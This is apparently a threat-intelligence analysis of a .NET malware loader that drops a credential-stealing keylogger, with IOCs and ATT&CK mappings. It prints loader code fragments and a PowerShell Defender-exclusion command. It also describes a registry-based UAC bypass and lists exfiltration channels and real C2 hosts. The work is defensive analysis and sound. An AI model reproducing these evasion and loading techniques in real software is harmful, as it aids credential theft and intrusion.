# Analyzed file
ec340fcd3a19f99978cfd326a00108ce04d9c295ef61723dfe12c46fc8be21b9, .NET 4.5, MalwareBazaar tags: exe, RGBLoader, SnakeKeylogger. Sample file renamed to snake.exe.

# Static analysis
DIE detects obfuscation (Modified EP), de4dot was used to remove it.

Entrypoint is at OsierBed.Program.Main(), main method - Application.Run(new FormGlavna());
FormGlavna itself contains 1000+ lines of code, almost all classes and methods are named in Croatian. Only exceptions are ComputeFluidDynamicsMetrics(), Extract(Bitmap image, int limit) and InitializeComponent(). The executable has two resources, KL and VSKN, both are Bitmap images. Extract is called in the middle of FormGlavna.InitializeComponent(), in the following context:

```csharp
Bitmap kl = Resources.KL;
Assembly assembly = Interaction.CallByName(AppDomain.CurrentDomain, "Load", CallType.Get, new object[] { FormGlavna.ScatterWriteExtractor.Extract(kl, 109056).ToArray<byte>() }) as Assembly;
Type type = assembly.GetTypes()[1];
string[] array = Regex.Split(FormGlavna.Pilow, "6B 6E 6E 6E");
string[] array2 = new string[]
{
    array[1],
    array[3],
    "OsierBed"
};
Type type2 = type;
object[] array3 = array2;
Activator.CreateInstance(type2, array3);
```

Before and after this part are standard Windows Forms object parameter declarations.
FormGlavna.Pilow string is `"6B 6E 6E 6E56534B4E6B 6E 6E 6E6B 6E 6E 6E6B76646B 6E 6E 6E6B 6E 6E 6E6B 6E 6E 6E6B 6E 6E 6E"`, and after Split the result is `array[1] = 56534B4E` ("VSKN") and `array[3] = 6B7664` ("kvd"). Interestingly, the Assembly is loaded through Interaction.CallByName, possibly, to avoid detection by a direct Assembly.Load call.

# Dynamic analysis
Stage 1: main exe launches, the assembly is extracted from KL and AdvancedSokoban.dll gets loaded.

Stage 2: CPU usage spikes, the process relaunches, requests to checkip[.]dyndns[.]org are made. If there is no internet connection, the process creates a WerFault.exe with parameters -u -p 1076 -s 1500 and quits.

Stage 3: AdvancedSokoban decodes the second bitmap (using VSKN as a name and kvd as a key), CPU usage spikes again, a PowerShell process with the command `Add-MpPreference -ExclusionPath "\path\to\sample.exe"` is launched, a third snake.exe process is created, this time containing an "Aubriella" assembly, AdvancedSokoban is no longer present. A sequence of requests to dyndns is made, after which the program starts requesting mail[.]universalltdsti[.]com.

The wait time between each stage is ~30 seconds.

AdvancedSokoban.dll and Aubriella.exe have been dumped from memory using dnSpy's debug mode.

## AdvancedSokoban.dll 
All namespaces, classes, methods, types and variables have names of 2-3 symbols from A-Za-z0-9. Numbers are stored fields of a generated class like

```csharp
<Module>{48e6c4e6-bffc-4d4e-b864-9c70846fc5d0}.m_49dcd76dde8947bda7d2fa944807d16d = new <Module>{48e6c4e6-bffc-4d4e-b864-9c70846fc5d0}();
<Module>{48e6c4e6-bffc-4d4e-b864-9c70846fc5d0}.m_49dcd76dde8947bda7d2fa944807d16d.m_4b51b45e607541d8a1dc872a87038dc8 = 1273868727;
<Module>{48e6c4e6-bffc-4d4e-b864-9c70846fc5d0}.m_49dcd76dde8947bda7d2fa944807d16d.m_23e9a38abfed4ae496d48dc744896f30 = 44257774;
```

And are XOR'ed at the place of reference, each with a unique value.
de4dot cannot identify the obfuscator.
Method arguments either are \u0020, or A_0-A_n.
All calls are made through (delegate).Lqk, which, for example, for a one variable function looks like

```csharp
public static void Lqk(Assembly A_0, x30 A_1)
    {
        A_1(A_0);
    }
```

Each function has its own delegate.

.NET method dependency is minimal. Instead, where possible, system .dll functions are used, and references to them are obtained in the following way: `GetDelegateForFunctionPointer(aBX.GetProcAddress(aBX.F6BhDkqRs(), "Find ".Trim() + "ResourceA"), typeof(aBX.SFZ));`. In that way, VirtualAlloc, WriteProcessMemory, VirtualProtect, OpenProcess and CloseHandle are obtained.
No attempts at a full deobfuscation were made.

## Aubriella.exe
All names are of type "Ȩ\u0327\u06E8m\u06E8" - 5 \uXXXX symbols, partly translated into Unicode characters. de4dot was used to make all the names readable.

First thing in the main function is a check for admin privileges, if they are missing, privilege escalation is executed through Class6.UACBypass.Elevate(). This method uses Registry Hijacking (HKCU\Software\Classes\ms-settings\shell\open\command), used executables - computerdefaults.exe and fodhelper.exe.

Next follow ~300 method calls, each trying to obtain some specified information: mail logins/passwords, logins/passwords/cookies/payment methods/history in browsers and other. Keylogging and screenshot functionality was found as well. Additionally, the machine's IP is compared to a pre-determined list, the check is named BotDetect. 

After that, all the obtained information is exfiltrated through a number of methods:
1. FTP to a set address,
2. email,
3. a Telegram bot,
4. server via `_send_.php`,
5. Discord webhook,
6. admin webpanel.

Only the SMTP channel is configured, other channels contain unfilled placeholders, for example `private static string string_35 = Class6.decode("%$DiscordWebhookURL$%", Class6.hashkey)`. decode() combines DES and MD5 to decrypt data. Using that function, the strings that are present were decrypted:
1. Sender's email address
2. Recipient's email address
3. SMTP server
4. SMTP password, will not be shared here
5. SMTP port
6. Pieces of a Telegram bot URL - "https://api.telegram.org/bot" and "/sendDocument?chat_id=", neither the bot token nor chat ID are provided
7. `application/x-ms-dos-executable` string, used in the Content-Type header

# Conclusion 
The analyzed sample is a complex .NET loader with two loading stages. The final payload is a stealer with broad collection capabilities and a large number of possible exfiltration channels. Next steps - further payload analysis for additional functionality, creation of detection rules, TI-analysis of found information.

### TI
Aubriella.exe compilation date: 2026-09-27, first detection and last analysis date on VirusTotal: 2026-10-07.

Based on strings present in the malware it can be identified as VIP Keylogger, which is widely tracked as a rebrand/successor of Snake Keylogger with substantial code overlap.

Malware sends emails from info[@]universalltdsti[.]com to johnobliss2[@]gmail[.]com using mail[.]universalltdsti[.]com as the SMTP server over the standard port 587.

universalltdsti[.]com is a Turkish website registered in 2007, at the time of writing it displays a "Website under construction" page. The website is hosted by Linesis. The long registration history suggests a legitimate but neglected domain whose mail account was likely compromised, rather than attacker-owned infrastructure (unconfirmed).

The `_send_.php` endpoint (`hxxp://51[.]38[.]247[.]67:8081/_send_.php?L`) is hardcoded in the code rather than stored in the build configuration, which suggests it may be shared across builds and controlled by the malware author rather than the operator (to be verified).

### IOC
Host:
- snake.exe: ec340fcd3a19f99978cfd326a00108ce04d9c295ef61723dfe12c46fc8be21b9
- AdvancedSokoban.dll: 405d0dcbe8454646de26e8b2db78435803b99dccdcbcdaa1028c56c7c0c6c3ec
- Aubriella.exe: 8707e9c07fd4deae3f23c55b5de8bac41611cc5512f809f75842ab38abb59833
- PowerShell ran with "Add-MpPreference -ExclusionPath ..."
- Registry key HKCU\Software\Classes\ms-settings\shell\open\command and fodhelper.exe/computerdefaults.exe processes with unusual child processes
- Assembly names (OsierBed, AdvancedSokoban, Aubriella) and resource names KL and VSKN

Network:
- Requests to mail[.]universalltdsti[.]com:587
- .php exfiltration server: 51[.]38[.]247[.]67:8081
- Requests to reallyfreegeoip.org

### ATT&CK
- T1106 - Native API
- T1204.002 - User Execution: Malicious File
- T1548.002 - Abuse Elevation Control Mechanism: Bypass User Account Control
- T1678 - Delay Execution
- T1027 - Obfuscated Files or Information:
- .003 - Steganography
- .007 - Dynamic API Resolution
- .010 - Command Obfuscation
- .013 - Encrypted/Encoded File
- T1140 - Deobfuscate/Decode Files or Information
- T1620 - Reflective Code Loading
- T1497 - Virtualization/Sandbox Evasion (? possibly, BotDetect)
- T1685 - Disable or Modify Tools
- T1055.012 - Process Injection: Process Hollowing
- T1059.001 - Command and Scripting Interpreter: PowerShell
- T1555 - Credentials from Password Stores
- T1555.003 - Credentials from Password Stores: Credentials from Web Browsers
- T1082 - System Information Discovery
- T1016.001 - System Network Configuration Discovery: Internet Connection Discovery
- T1614 - System Location Discovery
- T1217 - Browser Information Discovery
- T1680 - Local Storage Discovery
- T1115 - Clipboard Data
- T1056.001 - Input Capture: Keylogging
- T1113 - Screen Capture
- T1048 - Exfiltration Over Alternative Protocol
- T1567.004 - Exfiltration Over Web Service: Exfiltration Over Webhook (functionality is present but not implemented)
- T1041 - Exfiltration Over C2 Channel (functionality is present but not implemented)
